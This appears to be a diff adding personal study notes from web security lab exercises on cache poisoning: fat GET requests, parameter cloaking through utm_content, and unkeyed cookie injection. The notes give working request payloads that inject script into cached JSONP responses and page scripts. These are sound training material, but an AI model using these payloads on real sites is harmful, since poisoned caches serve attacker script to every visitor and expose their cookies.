@@ -1,0 +1,45 @@
+FAT GET REQ:
+good indicator is when theres a response header:
+Cache-Control: max-age=35
+X-Cache: hit
+
+add cache buster, like a parameter, or an additional header
+/?c=b 
+to avoid caching testing phase 
+
+FAT GET happens when we can include the same parameter as POST data in a GET request
+
+GET /js/geolocate.js?callback=setCountryCookie HTTP/2
+Host: 0ab50001034da2db811b7508003000e2.web-security-academy.net
+<ommited headers>
+
+callback=alert(document.cookie)&country=alert(document.cookie)
+
+
+PARAM CLOAKING
+
+Identify that the utm_content parameter is supported. Observe that it is also excluded from the cache key.
+
+Notice that if you use a semicolon (;) to append another parameter to utm_content, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key. Alternatively, with Param Miner loaded, right-click on the request and select "Bulk scan" > "Rails parameter cloaking scan" to identify the vulnerability automatically.
+
+Observe that if you add duplicate callback parameters, only the final one is reflected in the response, but both are still keyed. However, if you append the second callback parameter to the utm_content parameter using a semicolon, it is excluded from the cache key and still overwrites the callback function in the response:
+
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction
+
+HTTP/1.1 200 OK
+X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
+…
+arbitraryFunction({"country" : "United Kingdom"})
+
+Send the request again, but this time pass in alert(1) as the callback function:
+
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
+
+
+UNKEYED COOKIE, aka look for snippet like so:
+<script>
+            data = {"host":"0a1f00a90333973e818b20e800ed0083.web-security-academy.net","path":"/","frontend":"prod-cache-01"}
+</script>
+
+then insert as cookie, and hit the cache
+Cookie: session=x; fehost=prod-cache-01"}</script><script>alert(1)</script>//
